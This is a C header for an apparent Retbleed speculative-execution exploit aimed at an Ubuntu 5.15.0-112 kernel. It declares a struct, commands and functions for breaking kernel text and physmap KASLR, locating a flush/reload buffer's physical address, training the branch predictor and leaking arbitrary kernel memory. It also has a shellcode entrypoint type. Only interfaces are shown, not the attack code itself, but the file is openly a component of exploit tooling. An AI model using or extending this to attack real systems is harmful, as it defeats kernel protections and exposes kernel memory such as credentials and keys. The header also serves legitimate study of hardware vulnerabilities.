/* SPDX-License-Identifier: GPL-3.0-only */
#pragma once

#include "defs.h"
#include "offsets.h"

#define RETBLEED_ERROR_SIZE 256

enum {
    RETBLEED_CMD_INIT = 0,
    RETBLEED_CMD_BREAK_TEXT_KASLR = 1,
    RETBLEED_CMD_FIND_FR_BUFFER_PA = 2,
    RETBLEED_CMD_BREAK_PHYSMAP_KASLR = 3,
    RETBLEED_CMD_LEAK_MEMORY = 4,
    RETBLEED_CMD_FINISH = 5,
};

enum {
    KERNEL_VERSION_UBUNTU_5_15_0_112_GENERIC = 0,
};

struct retbleed {
    /* Physical address of the flush/reload array */
    u64 fr_array_pa;
    /* Start of the kernel text */
    u64 kaslr_base;
    /* Start of the physmap in the kernel */
    u64 physmap_base;
    /* NUL-terminated error message */
    char error[RETBLEED_ERROR_SIZE];
    /*
     * Timings for each memory access.
     * num_samples samples for 0, num_samples samples for 1, ...
     */
    u64 *samples;
    /* Memory region that we use for flush/reload */
    u8 *fr_region;
    u8 *fr_array;
    /* Number of samples for each byte measurement */
    u64 leak_samples;
    /* Per-kernel parameters */
    struct kernel_config config;
    /* Addresses to jump to to train the branch predictor */
    u8 *x64_sys_mmap_training_code;
    u8 *x64_sys_call_training_code;
    u8 *load_training_code;
    u8 *shift_training_code;
    /*
     * How many times to run the training code before calling the vulnerable
     * system call.
     */
    u64 training_iter;
    /* How many samples to use when bruteforcing the physmap/physical address. */
    u64 brute_samples;
};

#ifdef RETBLEED_STANDALONE

/* Type of the shellcode entrypoint. */
typedef u64 (retbleed_entry)(struct retbleed *retbleed, int cmd, u64 arg1, u64 arg2, u64 arg3, u64 arg4);

#else /* RETBLEED_STANDALONE */

u64 retbleed_leak_kernel_memory(struct retbleed *self, u64 address, u64 size, u8 *result);
int retbleed_init(struct retbleed *self, u64 leak_samples, int kernel_version, u64 training_iter, u64 brute_samples);
u64 retbleed_break_text_kaslr(struct retbleed *self);
int retbleed_init_training(struct retbleed *self);
u64 retbleed_find_fr_pa(struct retbleed *self);
u64 retbleed_break_physmap_kaslr(struct retbleed *self);
void retbleed_finish(struct retbleed *self);

#endif /* RETBLEED_STANDALONE */
